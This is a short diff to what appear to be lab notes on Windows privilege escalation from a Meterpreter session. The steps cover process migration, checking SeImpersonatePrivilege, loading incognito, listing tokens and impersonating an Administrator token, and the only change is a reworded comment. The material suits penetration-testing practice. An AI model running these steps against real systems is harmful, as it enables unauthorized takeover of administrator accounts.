@@ -31,7 +31,7 @@ In meterpreter session
 - migrate 3512 [ here 3512 is a process ID of explorer ]
 - getprivs [ this will list all the privileges of current user,here we find SeImpersonatePrivilege]
 - load incognito [ this will load the incognito module,this will fail bcz we migrate our session] 
-- run [ this will again run the exploit for initial access ]
+- run [ this will again run the exploit again for initial access ]
 - laod incognito
 - list_tokens -u [ this will list all the user token ]
 - impersonate_token "ATTACKDEFENSE\Administrator" [ here ATTACKDEFENSE\Administrator found from the previous command ]
